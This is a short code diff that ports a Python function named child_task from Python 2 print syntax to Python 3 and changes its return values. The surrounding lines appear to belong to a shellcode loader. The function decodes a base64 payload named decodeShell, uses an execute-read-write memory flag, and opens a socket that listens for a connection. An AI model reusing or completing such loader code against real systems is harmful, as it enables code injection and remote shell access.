@@ -60,8 +60,8 @@ def child_task(payload, port):
         # p.rlimit(psutil.R)
         # cpu_percent
 
-        print 'Hi, My pid is ', pid
-        print 'encoded string : ' + payload
+        print('Hi, My pid is ', pid)
+        print('encoded string : ' + payload)
         decodeShell = base64.b64decode(payload)
     ### Sample 
         page_rwx_value = 0x40
@@ -82,15 +82,15 @@ def child_task(payload, port):
         bind_addr = (child_host, child_port)
         shell_binding.bind(bind_addr)
         shell_binding.listen(1)
-        print >>sys.stderr, 'child waiting connection'
+        print('child waiting connection', file=sys.stderr)
         connection, client_addr = shell_binding.accept()
         ###
     ### Sample 
     time.sleep(1)
-    print 'child process done!'
-    print 'pid : %d' % (new_process)
+    print('child process done!')
+    print('pid : %d' % (new_process))
     if new_process == -1:
-        return 'false'
+        return False, None
     else:
-        return 'success'+','+str(new_process)
+        return True, new_process
     # os._exit(0)
